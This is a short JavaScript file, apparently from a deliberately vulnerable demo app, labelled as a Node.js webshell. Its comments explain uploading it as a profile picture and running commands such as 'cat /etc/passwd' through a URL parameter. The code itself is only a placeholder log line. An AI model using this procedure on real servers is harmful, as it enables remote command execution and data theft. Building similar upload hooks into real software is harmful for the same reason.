// Simple NodeJS Webshell
// Save this file as "webshell.js" and upload it as your profile picture
// Then access it at: /uploads/profile/webshell.js?cmd=ls

// This file will be executed server-side due to the vulnerable profile
// picture upload endpoint that allows any file type with no validation

// How to use:
// 1. Save this file as "webshell.js"
// 2. Go to your profile page and upload this file as your profile picture
// 3. Access the webshell at: http://[server-url]/uploads/profile/webshell.js?cmd=[command]
// 4. Example commands:
//    - ?cmd=ls -la
//    - ?cmd=cat /etc/passwd
//    - ?cmd=whoami
//    - ?cmd=netstat -an
//    - ?cmd=ps -ef

console.log("Webshell executed!");

// This is just a placeholder - the actual execution happens 
// server-side in the vulnerable middleware we added

// You don't need a complex payload since the server will
// recognize any .js file and execute commands from the URL parameter
